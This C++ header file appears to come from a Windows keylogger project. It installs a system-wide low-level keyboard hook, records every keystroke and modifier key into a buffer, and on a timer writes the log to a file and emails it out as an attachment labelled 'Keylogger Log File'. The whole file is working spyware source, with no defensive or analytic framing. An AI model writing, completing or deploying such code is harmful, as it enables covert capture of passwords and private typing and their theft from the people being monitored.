#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include <set>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

//This function can also be used to disable keys 
HHOOK eHook = NULL;

//EDIT TIME INTERVAL HERE
int timeInterval = 300 * 60;
std::string keylog = std::string();

void SendEmailTimer();
LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam);

Timer MailTimer(SendEmailTimer, timeInterval, Timer::Infinite);

bool InstalHook()
{
	Helper::WriteAppLog("Installing hook...");
	MailTimer.Start(true);
	HOOKPROC hkprcSysMsg;

	//OurKeyboardProc invoked by the hook system everytime the user presses a key
	hkprcSysMsg = (HOOKPROC)KeyboardProc;

	//using WH_KEYBOARD_LL instead of WH_KEYBOARD in order not to require a DLL
	//GetModuleHandle(null) returns the handle to the file used to create the calling process
	//0 means that the hook is associated with all threads
	eHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		hkprcSysMsg,
		GetModuleHandle(NULL),
		0);

	Helper::WriteAppLog("Succesfully installed hook");
	return eHook == NULL;
}

bool UninstalHook()
{
	BOOL b = UnhookWindowsHookEx(eHook);
	eHook = NULL;
	return (bool)b;
}

bool IsHooked()
{
	return (bool)(eHook == NULL);
}

void SendEmailTimer()
{
	std::string last_file = IO::WriteLog(keylog);

	if (keylog.empty())
	{
		Helper::WriteAppLog("WARNING: Email not sent as file is empty.");
		return;
	}
	else if (last_file.empty())
	{
		Helper::WriteAppLog("ERROR: File creation was unsuccesful. Keylog '" + keylog + "'");
		return;
	}

	std::string subject = "Keylogger Log File - " + last_file;
	std::string body = "Attached is the log file from the Keylogger.";
	std::string attachments = IO::GetOurPath(true) + last_file;
	int emailSentSuccesfully = Mail::SendMail(subject, body, attachments);

	if (emailSentSuccesfully != 7)
	{
		Helper::WriteAppLog("ERROR: Unable to sent email. Error code: " + Helper::ToString(emailSentSuccesfully));
		return;
	}

	keylog = std::string();
}

LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	//Propagate the hook
	if (nCode < 0)
	{
		CallNextHookEx(eHook, nCode, wparam, lparam);
	}

	//Struct that contains information about a low-level keyboard input event
	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

	//Whenver you press a key
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
		keylog += Keys::KEYS[kbs->vkCode].Name;
	}
	//Hold down a key long enough to start the keyboard's repeat feature
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
	{
		DWORD key = kbs->vkCode;
		std::set<DWORD> specialVirtualKeys;

		//List of sepcial vk
		specialVirtualKeys.insert(VK_LCONTROL);
		specialVirtualKeys.insert(VK_RCONTROL);
		specialVirtualKeys.insert(VK_LSHIFT);
		specialVirtualKeys.insert(VK_RSHIFT);
		specialVirtualKeys.insert(VK_CAPITAL);
		specialVirtualKeys.insert(VK_NUMLOCK);
		specialVirtualKeys.insert(VK_LWIN);
		specialVirtualKeys.insert(VK_RWIN);

		if (specialVirtualKeys.count(key) != 0)
		{
			std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
			KeyName.insert(1, "/");
			keylog += KeyName;
		}
	}

	return CallNextHookEx(eHook, nCode, wparam, lparam);
}
#endif 